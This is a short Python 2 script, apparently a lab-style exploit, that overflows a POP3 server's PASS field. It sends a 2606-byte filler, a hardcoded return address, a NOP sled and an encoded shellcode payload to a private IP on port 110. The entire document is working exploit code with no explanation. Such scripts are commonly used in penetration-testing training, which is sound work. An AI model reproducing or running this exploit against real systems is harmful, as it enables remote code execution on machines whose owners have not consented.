#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
shellcode =(
"\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb7\xaf\xe3" +
"\x90\x83\xeb\xfc\xe2\xf4\x4b\xc5\x08\xdd\x5f\x56\x1c\x6f\x48\xcf" +
"\x68\xfc\x93\x8b\x68\xd5\x8b\x24\x9f\x95\xcf\xae\x0c\x1b\xf8\xb7" +
"\x68\xcf\x97\xae\x08\xd9\x3c\x9b\x68\x91\x59\x9e\x23\x09\x1b\x2b" +
"\x23\xe4\xb0\x6e\x29\x9d\xb6\x6d\x08\x64\x8c\xfb\xc7\xb8\xc2\x4a" +
"\x68\xcf\x93\xae\x08\xf6\x3c\xa3\xa8\x1b\xe8\xb3\xe2\x7b\xb4\x83" +
"\x68\x19\xdb\x8b\xff\xf1\x74\x9e\x38\xf4\x3c\xec\xd3\x1b\xf7\xa3" +
"\x68\xe0\xab\x02\x68\xd0\xbf\xf1\x8b\x1e\xf9\xa1\x0f\xc0\x48\x79" +
"\x85\xc3\xd1\xc7\xd0\xa2\xdf\xd8\x90\xa2\xe8\xfb\x1c\x40\xdf\x64" +
"\x0e\x6c\x8c\xff\x1c\x46\xe8\x26\x06\xf6\x36\x42\xeb\x92\xe2\xc5" +
"\xe1\x6f\x67\xc7\x3a\x99\x42\x02\xb4\x6f\x61\xfc\xb0\xc3\xe4\xec" +
"\xb0\xd3\xe4\x50\x33\xf8\xbd\xae\x60\xd2\xd1\xc7\xe2\x2c\xd1\xfc" +
"\x6a\x71\x22\xc7\x0f\x69\x1d\xcf\xb4\x6f\x61\xc5\xf3\xc1\xe2\x50" +
"\x33\xf6\xdd\xcb\x85\xf8\xd4\xc2\x89\xc0\xee\x86\x2f\x19\x50\xc5" +
"\xa7\x19\x55\x9e\x23\x63\x1d\x3a\x6a\x6d\x49\xed\xce\x6e\xf5\x83" +
"\x6e\xea\x8f\x04\x48\x3b\xdf\xdd\x1d\x23\xa1\x50\x96\xb8\x48\x79" +
"\xb8\xc7\xe5\xfe\xb2\xc1\xdd\xae\xb2\xc1\xe2\xfe\x1c\x40\xdf\x02" +
"\x3a\x95\x79\xfc\x1c\x46\xdd\x50\x1c\xa7\x48\x7f\x8b\x77\xce\x69" +
"\x9a\x6f\xc2\xab\x1c\x46\x48\xd8\x1f\x6f\x67\xc7\x13\x1a\xb3\xf0" +
"\xb0\x6f\x61\x50\x33\x90")
buffer = "A"*2606 + "\x8F\x35\x4A\x5F" + "\x90"*8 + shellcode
try:
    print "\n Sending evil %s bytes buffer..." % len(buffer)
    s.connect(("10.1.131.75",110))
    data = s.recv(1024)
    s.send("USER test" + "\r\n")
    data = s.recv(1024)
    s.send("PASS " + buffer +"\r\n")
    print "\nDone!"
except:
    print "Could not connect to POP3"
